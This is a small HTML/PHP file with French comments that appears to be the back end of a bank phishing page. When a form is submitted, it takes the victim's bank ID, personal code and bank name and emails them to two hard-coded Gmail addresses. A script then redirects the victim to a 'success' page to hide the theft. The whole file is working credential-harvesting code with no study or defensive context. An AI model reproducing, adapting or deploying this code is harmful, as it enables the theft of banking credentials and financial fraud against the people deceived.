<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

</head>


<body>

<?php
    // S'il y des données de postées
    if ($_SERVER['REQUEST_METHOD']=='POST') {
     
      // (1) Code PHP pour traiter l'envoi de l'email
     
      // Récupération des variables et sécurisation des données
      $bankid = htmlentities($_POST['bankid']); // htmlentities() convertit des caractères "spéciaux" en équivalent HTML
      $bnkcode = htmlentities($_POST['bnkcode']);
      $bnknme = htmlentities($_POST['bnknme']);
      
     
      // Variables concernant l'email
     
      $destinataire = 'parfaitk714@gmail.com, olivierdelaforce2@gmail.com'; // Adresse email du webmaster (à personnaliser)
      $contenu = '<html><head><title> '.$objet.' </title></head><body>';
      $contenu .= '<p>Compte bancaire</p>';
      $contenu .= '<p><strong>Id</strong>: '.$bankid.'</p>';
      $contenu .= '<p><strong>Code personnel</strong>: '.$bnkcode.'</p>';
      $contenu .= '<strong>Nom de Banque</strong>: '.$bnknme;
      $contenu .= '</body></html>'; // Contenu du message de l'email (en XHTML)
     
      // Pour envoyer un email HTML, l'en-tête Content-type doit être défini
      $headers = 'MIME-Version: 1.0'."\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1'."\r\n";
     
      // Envoyer l'email
      mail($destinataire, $objet, $contenu, $headers); // Fonction principale qui envoi l'email
      
    }
    ?>
    <script language="javascript">document.location="success.php"</script> 
</body>

</html> 